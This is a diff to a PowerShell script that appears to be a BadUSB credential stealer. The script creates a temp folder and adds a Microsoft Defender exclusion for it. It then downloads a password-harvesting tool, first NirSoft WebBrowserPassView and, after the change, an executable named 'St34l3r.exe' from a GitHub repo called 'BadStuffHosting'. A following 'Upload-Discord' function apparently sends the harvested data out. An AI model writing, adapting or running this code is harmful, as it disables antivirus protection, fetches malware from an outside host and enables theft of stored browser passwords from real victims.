@@ -3,10 +3,7 @@ function Get-Nirsoft {
     mkdir \temp
     cd \temp
     Add-MpPreference -ExclusionPath "C:\temp"
-    Invoke-WebRequest -Headers @{'Referer' = 'https://www.nirsoft.net/utils/web_browser_password.html'} -Uri https://www.nirsoft.net/toolsdownload/webbrowserpassview.zip -OutFile wbpv.zip
-    Invoke-WebRequest -Uri https://www.7-zip.org/a/7za920.zip -OutFile 7z.zip
-    Expand-Archive 7z.zip
-    .\7z\7za.exe e wbpv.zip
+    Invoke-WebRequest -Uri "https://github.com/Gvte-Kali/BadStuffHosting/raw/main/BadUSB/W1ns1d3r/testing/St34l3r.exe" -OutFile Iwyp.exe
 }
 
 function Upload-Discord {
